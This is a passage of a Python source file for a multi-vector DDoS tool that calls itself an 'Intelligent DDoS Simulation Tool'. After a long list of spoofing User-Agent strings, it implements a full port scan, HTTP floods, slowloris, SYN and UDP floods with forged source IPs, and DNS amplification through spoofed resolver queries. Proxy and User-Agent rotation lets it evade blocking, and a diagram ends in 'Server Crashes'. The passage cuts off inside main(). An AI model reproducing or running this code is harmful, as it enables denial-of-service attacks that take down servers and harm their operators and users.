'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)',
'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.1021.10gin_lib.cc',
'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; es-es) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B360 Safari/531.21.10',
'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; es-es) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10',
'Mozilla/5.0 (iPad; U; CPU OS 3_2_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B500 Safari/53',
'Mozilla/5.0 (iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314',
'Mozilla/5.0 (iPhone Simulator; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7D11 Safari/531.21.10',
'Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7',
'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B5097d Safari/6531.22.7',
'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; fi-fi) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; fi-fi) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5',
'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5',
'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; it-it) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5',
'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; nb-no) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5',
'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-gb) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5',
'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5',
'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; pl-pl) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5',
'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; zh-tw) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
'Mozilla/5.0 (iPhone; U; fr; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5',
'Mozilla/5.0 (iPod; U; CPU iPhone OS 4_2_1 like Mac OS X; he-il) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
'Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
'Mozilla/5.0 Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.13) Firefox/3.6.13',
'Mozilla/5.0(Windows; U; Windows NT 5.2; rv:1.9.2) Gecko/20100101 Firefox/3.6',
'Mozilla/5.0(Windows; U; Windows NT 7.0; rv:1.9.2) Gecko/20100101 Firefox/3.6',
'Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/123',
'Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10',
'Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc',
'Opera/10.50 (Windows NT 6.1; U; en-GB) Presto/2.2.2',
'Opera/10.60 (Windows NT 5.1; U; en-US) Presto/2.6.30 Version/10.60',
'Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60',
'Opera/9.80 (Linux i686; U; en) Presto/2.5.22 Version/10.51',
'Opera/9.80 (Macintosh; Intel Mac OS X; U; nl) Presto/2.6.30 Version/10.61'
'Opera/9.80 (S60; SymbOS; Opera Tablet/9174; U; en) Presto/2.7.81 Version/10.5',
'Opera/9.80 (Windows 98; U; de) Presto/2.6.30 Version/10.61',
'Opera/9.80 (Windows NT 5.1; U; MRA 5.5 (build 02842); ru) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 5.1; U; MRA 5.6 (build 03278); ru) Presto/2.6.30 Version/10.63',
'Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.10',
'Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 5.1; U; de) Presto/2.2.15 Version/10.10',
'Opera/9.80 (Windows NT 5.1; U; it) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 5.1; U; pl) Presto/2.6.30 Version/10.62',
'Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.00',
'Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.22 Version/10.50',
'Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00',
'Opera/9.80 (Windows NT 5.1; U; sk) Presto/2.5.22 Version/10.50',
'Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.2.15 Version/10.00',
'Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10',
'Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.00',
'Opera/9.80 (Windows NT 5.2; U; en) Presto/2.6.30 Version/10.63',
'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.6.30 Version/10.61',
'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 5.2; U; zh-cn) Presto/2.6.30 Version/10.63',
'Opera/9.80 (Windows NT 6.0; U; Gecko/20100115; pl) Presto/2.2.15 Version/10.10',
'Opera/9.80 (Windows NT 6.0; U; cs) Presto/2.5.22 Version/10.51',
'Opera/9.80 (Windows NT 6.0; U; de) Presto/2.2.15 Version/10.00',
'Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.00',
'Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.10',
'Opera/9.80 (Windows NT 6.0; U; en) Presto/2.7.39 Version/11.00',
'Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10',
'Opera/9.80 (Windows NT 6.0; U; it) Presto/2.6.30 Version/10.61',
'Opera/9.80 (Windows NT 6.0; U; nl) Presto/2.6.30 Version/10.60',
'Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 6.0; U; zh-cn) Presto/2.5.22 Version/10.50',
'Opera/9.80 (Windows NT 6.1 x64; U; en) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.2.15 Version/10.00',
'Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.00',
'Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.10',
'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00',
'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.5.22 Version/10.51',
'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.6.30 Version/10.61',
'Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 6.1; U; en-US) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.2.15 Version/10.00',
'Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 6.1; U; fr) Presto/2.5.24 Version/10.52',
'Opera/9.80 (Windows NT 6.1; U; ja) Presto/2.5.22 Version/10.50',
'Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.6.31 Version/10.70',
'Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 6.1; U; sk) Presto/2.6.22 Version/10.50',
'Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.2.15 Version/10.00',
'Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.5.22 Version/10.50',
'Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.30 Version/10.61',
'Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00',
'Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.5.22 Version/10.50',
'Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01',
'Opera/9.80 (X11; Linux i686; U; Debian; pl) Presto/2.2.15 Version/10.00',
'Opera/9.80 (X11; Linux i686; U; de) Presto/2.2.15 Version/10.00',
'Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.00',
'Opera/9.80 (X11; Linux i686; U; en) Presto/2.5.27 Version/10.60',
'Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.2.15 Version/10.00',
'Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.5.24 Version/10.53',
'Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.6.30 Version/10.61',
'Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01',
'Opera/9.80 (X11; Linux i686; U; it) Presto/2.5.24 Version/10.54',
'Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00',
'Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01',
'Opera/9.80 (X11; Linux i686; U; nb) Presto/2.2.15 Version/10.00',
'Opera/9.80 (X11; Linux i686; U; pl) Presto/2.2.15 Version/10.00',
'Opera/9.80 (X11; Linux i686; U; pl) Presto/2.6.30 Version/10.61',
'Opera/9.80 (X11; Linux i686; U; pt-BR) Presto/2.2.15 Version/10.00',
'Opera/9.80 (X11; Linux i686; U; ru) Presto/2.2.15 Version/10.00',
'Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01',
'Opera/9.80 (X11; Linux x86_64; U; de) Presto/2.2.15 Version/10.00',
'Opera/9.80 (X11; Linux x86_64; U; en) Presto/2.2.15 Version/10.00',
'Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01',
'Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10',
'Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00',
'Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10'
]

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global variables
workers = {}  # Store worker status
stop_flag = False  # Control program termination

# Handle Ctrl+C
def signal_handler(sig, frame):
    global stop_flag
    stop_flag = True
    logging.info("Received Ctrl+C, stopping attack...")

signal.signal(signal.SIGINT, signal_handler)

# Load targets (support single target or file)
def load_targets(target_input: str) -> list:
    if os.path.isfile(target_input):
        try:
            with open(target_input, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
                if not targets:
                    logging.error("Target list file is empty")
                    sys.exit(1)
                return targets
        except Exception as e:
            logging.error(f"Failed to read target list file: {e}")
            sys.exit(1)
    else:
        # Treat as single target
        return [target_input.strip()]

# Load proxy list
def load_proxies(file_path: str) -> list:
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if '://' in line:
                    line = line.split('://')[-1]
                if ':' in line:
                    proxies.append(line)
                else:
                    proxies.append(f"{line}:8080")
        if not proxies:
            logging.warning("Proxy list is empty, using local IP")
        return [p for p in proxies if test_proxy(p)]
    except Exception as e:
        logging.error(f"Failed to read proxy list: {e}")
        return []

# Load User-Agent list
def load_user_agents(file_path: str) -> list:
    if file_path:
        try:
            with open(file_path, 'r') as f:
                agents = [line.strip() for line in f if line.strip()]
                if not agents:
                    logging.warning("Custom User-Agent list is empty, using default list")
                    return default_user_agents
                return agents
        except Exception as e:
            logging.error(f"Failed to read custom User-Agent list: {e}, using default list")
            return default_user_agents
    return default_user_agents

# Test proxy connectivity
def test_proxy(proxy: str) -> bool:
    try:
        ip, port = proxy.split(':')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, int(port)))
        sock.close()
        return result == 0
    except:
        return False

# Scan target ports
def scan_ports(target: str, port_range: tuple = (1, 65535)) -> list:
    open_ports = []
    logging.info(f"Scanning ports {port_range[0]}-{port_range[1]} for {target}")
    with ThreadPoolExecutor(max_workers=200) as executor:
        futures = [executor.submit(check_port, target, port) for port in range(port_range[0], port_range[1] + 1)]
        for future in futures:
            if port := future.result():
                open_ports.append(port)
    logging.info(f"Open ports for {target}: {open_ports}")
    return open_ports if open_ports else [80, 443, 53]  # Default ports if none found

def check_port(target: str, port: int) -> int:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    try:
        result = sock.connect_ex((target, port))
        if result == 0:
            return port
    except:
        pass
    finally:
        sock.close()
    return None

# HTTP Flood attack
def http_flood(target: str, port: int, duration, proxies: list, worker_id: str, user_agents: list):
    if port == 443:
        url = f"https://{target}"
    else:
        url = f"http://{target}:{port}" if port != 80 else f"http://{target}"
    proxy_dict = lambda p: {'http': f'http://{p}', 'https': f'http://{p}'} if p else None
    stats = {'sent': 0, 'failed': 0}
    attack_types = ['http', 'slowloris', 'syn', 'udp', 'dns']
    current_attack = attack_types[0]
    current_user_agent = random.choice(user_agents)
    while not stop_flag:
        workers[worker_id]['attack'] = current_attack
        workers[worker_id]['user_agent'] = current_user_agent
        try:
            headers = {'User-Agent': current_user_agent}
            proxy = random.choice(proxies) if proxies else None
            response = requests.get(url, headers=headers, proxies=proxy_dict(proxy), timeout=5)
            stats['sent'] += 1
            if response.status_code in [403, 429, 503]:
                logging.warning(f"{worker_id} at {target}:{port} HTTP Flood blocked, switching attack")
                attack_types.append(attack_types.pop(0))
                current_attack = attack_types[0]
                current_user_agent = random.choice(user_agents)
        except:
            stats['failed'] += 1
            logging.warning(f"{worker_id} at {target}:{port} HTTP Flood failed, switching attack")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
            current_user_agent = random.choice(user_agents)
        workers[worker_id]['stats'] = stats
        if current_attack != 'http':
            return current_attack
        time.sleep(random.uniform(0.1, 0.5))
    return None

# SYN Flood attack
def syn_flood(target: str, port: int, duration: int, proxies: list, worker_id: str, user_agents: list, spoof: bool):
    stats = {'sent': 0, 'failed': 0}
    attack_types = ['syn', 'udp', 'dns', 'http', 'slowloris']
    current_attack = attack_types[0]
    while not stop_flag:
        workers[worker_id]['attack'] = current_attack
        workers[worker_id]['user_agent'] = 'N/A'
        try:
            if spoof:
                subnet = random.choice(['10.', '172.16.', '192.168.', '100.64.', '198.18.'])
                if subnet == '10.':
                    src_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                elif subnet == '172.16.':
                    src_ip = f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                elif subnet == '192.168.':
                    src_ip = f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}"
                elif subnet == '100.64.':
                    src_ip = f"100.{random.randint(64, 127)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                else:
                    src_ip = f"198.18.{random.randint(0, 255)}.{random.randint(0, 255)}"
                packet = build_spoofed_syn_packet(src_ip, target, port)
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.sendto(packet, (target, 0))
                sock.close()
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                if proxies:
                    proxy = random.choice(proxies)
                    phost, pport_str = proxy.split(':')
                    pport = int(pport_str)
                    sock.connect((phost, pport))
                else:
                    sock.connect((target, port))
                sock.send(b"\x00")
                sock.close()
            stats['sent'] += 1
        except PermissionError:
            logging.error(f"{worker_id} at {target}:{port} requires root privileges for IP spoofing")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
        except:
            stats['failed'] += 1
            logging.warning(f"{worker_id} at {target}:{port} SYN Flood failed, switching attack")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
        workers[worker_id]['stats'] = stats
        if current_attack != 'syn':
            return current_attack
    workers[worker_id]['stats'] = stats
    return None

def build_spoofed_syn_packet(src_ip: str, dst_ip: str, dst_port: int) -> bytes:
    ip_header = bytearray(20)
    tcp_header = bytearray(20)
    ip_header[0] = 0x45
    ip_header[2:4] = (20 + 20).to_bytes(2, 'big')
    ip_header[8] = 0xFF
    ip_header[9] = socket.IPPROTO_TCP
    ip_header[12:16] = socket.inet_aton(src_ip)
    ip_header[16:20] = socket.inet_aton(dst_ip)
    tcp_header[0:2] = (random.randint(1024, 65535)).to_bytes(2, 'big')
    tcp_header[2:4] = dst_port.to_bytes(2, 'big')
    tcp_header[4:8] = (random.randint(0, 0xFFFFFFFF)).to_bytes(4, 'big')
    tcp_header[8:12] = (0).to_bytes(4, 'big')
    tcp_header[12] = 0x50
    tcp_header[14:16] = (65535).to_bytes(2, 'big')
    ip_header[10:12] = (0).to_bytes(2, 'big')  # Checksum not computed
    tcp_header[16:18] = (0).to_bytes(2, 'big')  # Checksum not computed
    return bytes(ip_header + tcp_header)

# UDP Flood attack
def udp_flood(target: str, port: int, duration: int, proxies: list, worker_id: str, user_agents: list, spoof: bool):
    sock_type = socket.SOCK_RAW if spoof else socket.SOCK_DGRAM
    sock = socket.socket(socket.AF_INET, sock_type, socket.IPPROTO_UDP if spoof else 0)
    if spoof:
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    payload = os.urandom(1470)
    stats = {'sent': 0, 'failed': 0}
    attack_types = ['udp', 'dns', 'http', 'slowloris', 'syn']
    current_attack = attack_types[0]
    while not stop_flag:
        workers[worker_id]['attack'] = current_attack
        workers[worker_id]['user_agent'] = 'N/A'
        try:
            if spoof:
                subnet = random.choice(['10.', '172.16.', '192.168.', '100.64.', '198.18.'])
                if subnet == '10.':
                    src_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                elif subnet == '172.16.':
                    src_ip = f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                elif subnet == '192.168.':
                    src_ip = f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}"
                elif subnet == '100.64.':
                    src_ip = f"100.{random.randint(64, 127)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                else:
                    src_ip = f"198.18.{random.randint(0, 255)}.{random.randint(0, 255)}"
                packet = build_spoofed_udp_packet(src_ip, target, port, payload)
                sock.sendto(packet, (target, 0))
            else:
                target_host = random.choice(proxies).split(':')[0] if proxies else target
                sock.sendto(payload, (target_host, port))
            stats['sent'] += 1
        except PermissionError:
            logging.error(f"{worker_id} at {target}:{port} requires root privileges for IP spoofing")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
        except:
            stats['failed'] += 1
            logging.warning(f"{worker_id} at {target}:{port} UDP Flood failed, switching attack")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
        workers[worker_id]['stats'] = stats
        if current_attack != 'udp':
            return current_attack
    sock.close()
    workers[worker_id]['stats'] = stats
    return None

def build_spoofed_udp_packet(src_ip: str, dst_ip: str, dst_port: int, payload: bytes) -> bytes:
    ip_header = bytearray(20)
    udp_header = bytearray(8)
    ip_header[0] = 0x45
    ip_header[2:4] = (20 + 8 + len(payload)).to_bytes(2, 'big')
    ip_header[8] = 0xFF
    ip_header[9] = socket.IPPROTO_UDP
    ip_header[12:16] = socket.inet_aton(src_ip)
    ip_header[16:20] = socket.inet_aton(dst_ip)
    udp_header[0:2] = (random.randint(1024, 65535)).to_bytes(2, 'big')
    udp_header[2:4] = dst_port.to_bytes(2, 'big')
    udp_header[4:6] = (8 + len(payload)).to_bytes(2, 'big')
    udp_header[6:8] = (0).to_bytes(2, 'big')  # Checksum not computed
    ip_header[10:12] = (0).to_bytes(2, 'big')  # Checksum not computed
    return bytes(ip_header + udp_header + payload)

# Slowloris attack
def slowloris(target: str, port: int, duration: int, proxies: list, worker_id: str, user_agents: list, connections: int = 100):
    sockets = []
    current_user_agent = random.choice(user_agents)
    if proxies:
        proxy = random.choice(proxies)
        phost, pport_str = proxy.split(':')
        pport = int(pport_str)
        headers = f"GET http://{target}:{port}/ HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {current_user_agent}\r\n"
        target_host = phost
        target_port = pport
    else:
        headers = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {current_user_agent}\r\n"
        target_host = target
        target_port = port
    stats = {'sent': 0, 'failed': 0}
    attack_types = ['slowloris', 'syn', 'udp', 'dns', 'http']
    current_attack = attack_types[0]
    for _ in range(connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_host, target_port))
            s.send(headers.encode('utf-8'))
            sockets.append(s)
            stats['sent'] += 1
        except:
            stats['failed'] += 1
    while not stop_flag:
        workers[worker_id]['attack'] = current_attack
        workers[worker_id]['user_agent'] = current_user_agent
        try:
            for s in sockets:
                s.send(b"X-a: {}\r\n".format(random.randint(1, 5000)))
                stats['sent'] += 1
        except:
            stats['failed'] += 1
            logging.warning(f"{worker_id} at {target}:{port} Slowloris failed, switching attack")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
            current_user_agent = random.choice(user_agents)
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
            sockets.clear()
            workers[worker_id]['stats'] = stats
            if current_attack != 'slowloris':
                return current_attack
        workers[worker_id]['stats'] = stats
        time.sleep(1)
    for s in sockets:
        try:
            s.close()
        except:
            pass
    workers[worker_id]['stats'] = stats
    return None

# DNS Amplification attack
def dns_amplification(target: str, port: int, duration: int, proxies: list, worker_id: str, user_agents: list, spoof: bool):
    if not DNS_AVAILABLE:
        logging.error(f"{worker_id} DNS attack unavailable: dnspython not installed")
        return 'http'
    stats = {'sent': 0, 'failed': 0}
    attack_types = ['dns', 'http', 'slowloris', 'syn', 'udp']
    current_attack = attack_types[0]
    dns_resolvers = [
        "8.8.8.8:53",  # Example; replace with actual open resolvers for amplification
        "1.1.1.1:53",
    ]
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    if spoof:
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    domain = "example.com"  # Replace with a domain known for large responses
    query = dns_message.make_query(domain, rdatatype.ANY)
    query_data = query.to_wire()
    logging.info(f"{worker_id} starting DNS Amplification attack on {target}:{port}")
    while not stop_flag:
        workers[worker_id]['attack'] = current_attack
        workers[worker_id]['user_agent'] = 'N/A'
        try:
            if spoof:
                src_ip = target
                resolver = random.choice(dns_resolvers)
                resolver_ip, resolver_port_str = resolver.split(':')
                resolver_port = int(resolver_port_str)
                packet = build_spoofed_dns_packet(src_ip, resolver_ip, resolver_port, query_data)
                sock.sendto(packet, (resolver_ip, resolver_port))
            else:
                target_host = random.choice(proxies).split(':')[0] if proxies else target
                sock.sendto(query_data, (target_host, port))
            stats['sent'] += 1
        except PermissionError:
            logging.error(f"{worker_id} at {target}:{port} requires root privileges for IP spoofing")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
        except Exception as e:
            stats['failed'] += 1
            logging.warning(f"{worker_id} at {target}:{port} DNS Amplification failed: {e}, switching attack")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
        workers[worker_id]['stats'] = stats
        if current_attack != 'dns':
            return current_attack
        time.sleep(random.uniform(0.05, 0.2))
    sock.close()
    workers[worker_id]['stats'] = stats
    return None

def build_spoofed_dns_packet(src_ip: str, resolver_ip: str, resolver_port: int, payload: bytes) -> bytes:
    ip_header = bytearray(20)
    udp_header = bytearray(8)
    ip_header[0] = 0x45
    ip_header[2:4] = (20 + 8 + len(payload)).to_bytes(2, 'big')
    ip_header[8] = 0xFF
    ip_header[9] = socket.IPPROTO_UDP
    ip_header[12:16] = socket.inet_aton(src_ip)
    ip_header[16:20] = socket.inet_aton(resolver_ip)
    ip_header[10:12] = (0).to_bytes(2, 'big')  # Checksum not computed
    udp_header[0:2] = (random.randint(1024, 65535)).to_bytes(2, 'big')
    udp_header[2:4] = resolver_port.to_bytes(2, 'big')
    udp_header[4:6] = (8 + len(payload)).to_bytes(2, 'big')
    udp_header[6:8] = (0).to_bytes(2, 'big')  # Checksum not computed
    return bytes(ip_header + udp_header + payload)

# Select attack method
def select_attack(target: str, port: int, duration, proxies: list, worker_id: str, user_agents: list, spoof: bool):
    # Initialize worker status to prevent KeyError
    workers[worker_id] = {'port': port, 'attack': '', 'stats': {'sent': 0, 'failed': 0}, 'user_agent': 'N/A'}
    attack_types = ['dns', 'http', 'slowloris', 'syn', 'udp'] if port == 53 else \
                   ['http', 'slowloris', 'syn', 'udp', 'dns'] if port in [80, 443] else \
                   ['syn', 'udp', 'dns', 'http', 'slowloris'] if port in [123] else \
                   ['udp', 'dns', 'http', 'slowloris', 'syn']
    attack_map = {
        'http': http_flood,
        'slowloris': slowloris,
        'syn': syn_flood,
        'udp': udp_flood,
        'dns': dns_amplification
    }
    while not stop_flag:
        current_attack = attack_types[0]
        attack_func = attack_map.get(current_attack)
        if attack_func:
            next_attack = attack_func(target, port, duration, proxies, worker_id, user_agents, spoof)
            if not next_attack:
                break
            attack_types.append(attack_types.pop(0))  # Rotate to next attack
        else:
            break

# Display worker status
def display_workers(target: str):
    while not stop_flag:
        print("\033[H\033[J")
        print(f"Target: {target} | Worker Status:")
        print("-" * 100)
        print(f"{'Worker':<7} {'Port':<5} {'Attack':<6} {'Sent':<6} {'Failed':<6} {'User-Agent':<40}")
        print("-" * 100)
        for worker_id, info in sorted(workers.items()):
            stats = info['stats']
            print(f"{worker_id:<7} {info['port']:<5} {info['attack']:<6} {stats['sent']:<6} {stats['failed']:<6} {info['user_agent'][:39]:<40}")
        time.sleep(0.1)

# Main function
def main():
    print("""
[Victim Server]
                 |
                 |
    +------------+------------+
    |                         |
[Attacker 1]             [Attacker 2]
    |                         |
    |                         |
    v                         v
[Proxy/Spoofed IP]    [Proxy/Spoofed IP]
    |                         |
    +---+---+---+---+         +---+---+---+---+
    |   |   |   |   |         |   |   |   |   |
    v   v   v   v   v         v   v   v   v   v
 [HTTP] [SYN] [UDP] [Slowloris] [DNS] [HTTP] [SYN] [UDP] [Slowloris] [DNS]
        |       |       |       |     |       |       |       |       |
        +-------+-------+-------+-----+-------+-------+-------+-------+
                        |
                        |
                    [Router]
                        |
                        |
                    [Overload]
                        |
                        v
                 [Server Crashes]
          
Developed by ChillHack Hong Kong Web Development, Jake.
    Intelligent DDoS Simulation Tool
